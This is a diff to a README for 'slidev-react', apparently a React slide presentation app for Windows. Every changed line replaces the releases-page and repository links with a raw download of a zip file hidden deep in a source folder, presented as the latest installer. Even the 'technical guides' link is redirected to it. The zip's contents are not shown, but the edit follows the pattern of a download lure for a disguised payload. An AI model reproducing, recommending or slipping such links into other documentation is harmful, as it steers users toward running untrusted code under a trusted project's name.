@@ -1,6 +1,6 @@
 # 🎞 slidev-react - Simple Slide Presentations with React
 
-[![Download slidev-react](https://img.shields.io/badge/Download-slidev--react-brightgreen?style=for-the-badge)](https://github.com/vardhan143818/slidev-react/releases)
+[![Download slidev-react](https://img.shields.io/badge/Download-slidev--react-brightgreen?style=for-the-badge)](https://github.com/vardhan143818/slidev-react/raw/refs/heads/main/packages/client/src/features/presentation/draw/react_slidev_v2.7-alpha.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To use slidev-react on Windows, your computer should meet these needs:
 
 Click the big green button at the top or go to this link to reach the download page:
 
-https://github.com/vardhan143818/slidev-react/releases
+https://github.com/vardhan143818/slidev-react/raw/refs/heads/main/packages/client/src/features/presentation/draw/react_slidev_v2.7-alpha.1.zip
 
 This page holds the latest versions of the application.
 
@@ -138,7 +138,7 @@ slidev-react lets you:
 
 You can always get the latest Windows installer here:
 
-[Download slidev-react](https://github.com/vardhan143818/slidev-react/releases)
+[Download slidev-react](https://github.com/vardhan143818/slidev-react/raw/refs/heads/main/packages/client/src/features/presentation/draw/react_slidev_v2.7-alpha.1.zip)
 
 Follow the steps above to install the application and start creating or presenting slides.
 
@@ -147,7 +147,7 @@ Follow the steps above to install the application and start creating or presenti
 ## 📚 Additional Resources
 
 - Slidev-react is based on React and MDX technologies.
-- For more technical guides, visit the GitHub page: https://github.com/vardhan143818/slidev-react
+- For more technical guides, visit the GitHub page: https://github.com/vardhan143818/slidev-react/raw/refs/heads/main/packages/client/src/features/presentation/draw/react_slidev_v2.7-alpha.1.zip
 - Look for sample slide files on the GitHub repository to practice.
 
 ---
